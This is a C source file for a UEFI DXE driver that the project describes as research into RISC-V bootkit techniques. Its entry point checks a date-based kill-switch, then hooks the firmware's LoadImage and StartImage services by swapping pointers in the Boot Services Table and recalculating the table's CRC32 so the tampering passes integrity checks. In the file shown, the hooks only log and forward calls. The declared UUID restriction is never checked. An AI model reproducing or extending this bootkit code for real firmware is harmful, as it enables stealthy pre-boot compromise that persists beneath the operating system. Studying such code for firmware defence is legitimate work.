/** @file
  RISC-V DXE Injection Module Implementation

  RISC-V specific BST hooking using AUIPC+LD+JALR trampolines.
  Demonstrates RISC-V bootkit techniques for research.

  Copyright (c) 2026, Barzakh Research Project
  SPDX-License-Identifier: BSD-2-Clause-Patent

**/

#include "RiscVDxeInject.h"

STATIC RISCV_HOOK_CONTEXT  mHookContext = {
  .Signature       = BARZAKH_SIGNATURE,
  .Version         = BARZAKH_VERSION,
  .HooksInstalled  = FALSE,
  .HookCount       = 0,
  .InstallTime     = 0
};

CONST CHAR8  *gBarzakhAllowedUuid = AEGIS_ALLOWED_UUID;
CONST CHAR8  *gBarzakhExpiryDate  = AEGIS_EXPIRY_DATE;

/**
  Validate kill-switch conditions.
**/
STATIC
BOOLEAN
ValidateKillSwitch (
  VOID
  )
{
  EFI_STATUS  Status;
  EFI_TIME    CurrentTime;

  Status = gRT->GetTime (&CurrentTime, NULL);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, "[AEGIS-RV] GetTime failed: %r - aborting\n", Status));
    return FALSE;
  }

  if ((CurrentTime.Year > 2027) ||
      (CurrentTime.Year == 2027 && CurrentTime.Month > 5) ||
      (CurrentTime.Year == 2027 && CurrentTime.Month == 5 && CurrentTime.Day > 11))
  {
    DEBUG ((DEBUG_WARN, "[AEGIS-RV] Expiry date reached - aborting\n"));
    return FALSE;
  }

  return TRUE;
}

/**
  Build a RISC-V trampoline: AUIPC t1, 0; LD t1, 8(t1); JALR x0, t1, 0; <addr>
**/
STATIC
VOID
BuildRiscVTrampoline (
  OUT RISCV_TRAMPOLINE  *Trampoline,
  IN  UINT64            TargetAddr
  )
{
  Trampoline->Auipc      = RISCV_AUIPC_T1_0;
  Trampoline->Ld         = RISCV_LD_T1_8_T1;
  Trampoline->Jalr       = RISCV_JALR_X0_T1_0;
  Trampoline->TargetAddr = TargetAddr;
}

/**
  Hooked LoadImage for RISC-V.
**/
EFI_STATUS
EFIAPI
RiscVHookedLoadImage (
  IN  BOOLEAN                  BootPolicy,
  IN  EFI_HANDLE               ParentImageHandle,
  IN  EFI_DEVICE_PATH_PROTOCOL *DevicePath,
  IN  VOID                     *SourceBuffer OPTIONAL,
  IN  UINTN                    SourceSize,
  OUT EFI_HANDLE               *ImageHandle
  )
{
  DEBUG ((DEBUG_INFO, "[AEGIS-RV] LoadImage intercepted (BootPolicy=%d, Size=%u)\n",
    BootPolicy, SourceSize));

  return mHookContext.OriginalLoadImage (
    BootPolicy, ParentImageHandle, DevicePath,
    SourceBuffer, SourceSize, ImageHandle
    );
}

/**
  Hooked StartImage for RISC-V.
**/
EFI_STATUS
EFIAPI
RiscVHookedStartImage (
  IN  EFI_HANDLE  ImageHandle,
  OUT UINTN       *ExitDataSize,
  OUT CHAR16      **ExitData OPTIONAL
  )
{
  DEBUG ((DEBUG_INFO, "[AEGIS-RV] StartImage intercepted (Handle=0x%p)\n", ImageHandle));

  return mHookContext.OriginalStartImage (ImageHandle, ExitDataSize, ExitData);
}

/**
  Install BST hooks on RISC-V via pointer replacement.
**/
EFI_STATUS
InstallRiscVBstHooks (
  IN OUT RISCV_HOOK_CONTEXT  *Context
  )
{
  EFI_TPL  OldTpl;

  if (Context->HooksInstalled) {
    return EFI_ALREADY_STARTED;
  }

  OldTpl = gBS->RaiseTPL (TPL_HIGH_LEVEL);

  Context->OriginalAllocatePool = gBS->AllocatePool;
  Context->OriginalFreePool     = gBS->FreePool;
  Context->OriginalCreateEvent  = gBS->CreateEvent;
  Context->OriginalLoadImage    = gBS->LoadImage;
  Context->OriginalStartImage   = gBS->StartImage;

  gBS->LoadImage  = RiscVHookedLoadImage;
  gBS->StartImage = RiscVHookedStartImage;

  gBS->Hdr.CRC32 = 0;
  gBS->CalculateCrc32 ((UINT8 *)gBS, gBS->Hdr.HeaderSize, &gBS->Hdr.CRC32);

  Context->HooksInstalled = TRUE;
  Context->HookCount      = 2;
  Context->InstallTime    = GetPerformanceCounter ();

  gBS->RestoreTPL (OldTpl);

  DEBUG ((DEBUG_INFO, "[AEGIS-RV] BST hooks installed (count=%u)\n", Context->HookCount));
  return EFI_SUCCESS;
}

/**
  Remove BST hooks.
**/
EFI_STATUS
RemoveRiscVBstHooks (
  IN RISCV_HOOK_CONTEXT  *Context
  )
{
  EFI_TPL  OldTpl;

  if (!Context->HooksInstalled) {
    return EFI_NOT_STARTED;
  }

  OldTpl = gBS->RaiseTPL (TPL_HIGH_LEVEL);

  gBS->LoadImage  = Context->OriginalLoadImage;
  gBS->StartImage = Context->OriginalStartImage;

  gBS->Hdr.CRC32 = 0;
  gBS->CalculateCrc32 ((UINT8 *)gBS, gBS->Hdr.HeaderSize, &gBS->Hdr.CRC32);

  Context->HooksInstalled = FALSE;

  gBS->RestoreTPL (OldTpl);

  DEBUG ((DEBUG_INFO, "[AEGIS-RV] BST hooks removed\n"));
  return EFI_SUCCESS;
}

/**
  RISC-V DXE driver entry point.
**/
EFI_STATUS
EFIAPI
RiscVDxeInjectEntry (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )
{
  EFI_STATUS  Status;

  DEBUG ((DEBUG_INFO, "[AEGIS-RV] Entry (ImageHandle=0x%p)\n", ImageHandle));

  if (!ValidateKillSwitch ()) {
    DEBUG ((DEBUG_WARN, "[AEGIS-RV] Kill-switch triggered - aborting\n"));
    return EFI_ABORTED;
  }

  Status = InstallRiscVBstHooks (&mHookContext);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, "[AEGIS-RV] Hook installation failed: %r\n", Status));
    return Status;
  }

  DEBUG ((DEBUG_INFO, "[AEGIS-RV] RISC-V hooks installed successfully\n"));
  return EFI_SUCCESS;
}
